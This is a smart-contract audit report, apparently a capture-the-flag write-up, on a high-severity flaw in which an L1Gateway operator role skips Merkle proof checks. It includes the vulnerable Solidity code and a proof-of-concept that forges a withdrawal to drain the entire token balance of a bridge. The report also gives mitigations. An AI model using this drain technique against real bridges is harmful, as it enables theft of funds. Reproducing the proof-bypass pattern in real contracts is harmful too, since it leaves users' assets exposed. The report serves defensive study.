---
title: Withdrawal Audit Report
author: Jack
date: January 21, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] `L1Gateway` operator role bypasses Merkle proof verification, enabling fabrication of arbitrary withdrawal messages to drain the token bridge

**Description:** `L1Gateway::finalizeWithdrawal()` verifies withdrawal authenticity using Merkle proofs for non-operator callers. However, accounts with `OPERATOR_ROLE` entirely skip this verification:

```solidity
function finalizeWithdrawal(
    uint256 nonce,
    address l2Sender,
    address target,
    uint256 timestamp,
    bytes memory message,
    bytes32[] memory proof
) external {
    if (timestamp + DELAY > block.timestamp) revert EarlyWithdrawal();

    bytes32 leaf = keccak256(abi.encode(nonce, l2Sender, target, timestamp, message));

    // ⚠️ Operator skips Merkle proof entirely — can pass arbitrary parameters
    bool isOperator = hasAnyRole(msg.sender, OPERATOR_ROLE);
    if (!isOperator) {
        if (!MerkleProof.verify(proof, root, leaf)) {
            revert InvalidProof();
        }
    }

    finalizedWithdrawals[leaf] = true;
    // ...
    bool success;
    assembly {
        success := call(gas(), target, 0, add(message, 0x20), mload(message), 0, 0)
    }
}
```

An operator can call `finalizeWithdrawal()` with a completely fabricated `message` — one that was never submitted to the L2 message store and has no corresponding Merkle leaf. By crafting a message that calls `TokenBridge::withdraw()` with an arbitrary recipient and amount, an operator can drain any amount of tokens from the bridge, provided enough time has elapsed since a reference timestamp. 

The 7-day delay check (`timestamp + DELAY > block.timestamp`) only protects against immediate exploitation; an operator can pass a past timestamp that is already beyond the delay window.

**Impact:** A malicious or compromised operator can steal arbitrary amounts of tokens from `TokenBridge` without any legitimate L2 withdrawal request. In the challenge scenario, the operator can drain the bridge's entire DVT balance in a single transaction by constructing a synthetic withdrawal message.

**Proof of Concept:**

```solidity
// Construct a synthetic withdrawal: bridge transfers all DVT to recovery
bytes memory withdrawMessage = abi.encodeCall(
    TokenBridge.executeTokenWithdrawal,
    (recovery, token.balanceOf(address(bridge)))
);

// Encode a call via L1Forwarder → TokenBridge
bytes memory forwarderMessage = abi.encodeCall(
    L1Forwarder.forwardMessage,
    (0, l2Handler, address(bridge), withdrawMessage)
);

// Operator submits fabricated withdrawal (no proof needed, past timestamp used)
l1Gateway.finalizeWithdrawal(
    0,                    // nonce
    l2Handler,            // l2Sender
    address(l1Forwarder), // target
    oldTimestamp,         // timestamp (already past 7-day delay)
    forwarderMessage,     // fabricated message
    new bytes32[](0)      // empty proof — operator bypasses check
);
// All bridge DVT transferred to recovery
```

**Recommended Mitigation:**

1. **Remove the operator bypass for Merkle proof verification (recommended):** The operator role should only be allowed to accelerate processing of valid, already-proven withdrawals — not to skip proof verification entirely:

   ```diff
   - bool isOperator = hasAnyRole(msg.sender, OPERATOR_ROLE);
   - if (!isOperator) {
   -     if (!MerkleProof.verify(proof, root, leaf)) revert InvalidProof();
   - }
   + if (!MerkleProof.verify(proof, root, leaf)) revert InvalidProof();
   ```

2. **If the operator bypass is required for operational reasons**, strictly limit what an operator can finalize: require the leaf to exist in a pre-committed pending withdrawal queue that was populated from verified L2 data, rather than allowing arbitrary parameter construction.

3. **Implement multi-party operator approval:** Require M-of-N operator signatures to finalize any withdrawal, making a single compromised key insufficient.

4. **Emit detailed events and monitor for anomalous withdrawals** that do not correspond to known L2 withdrawal nonces.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
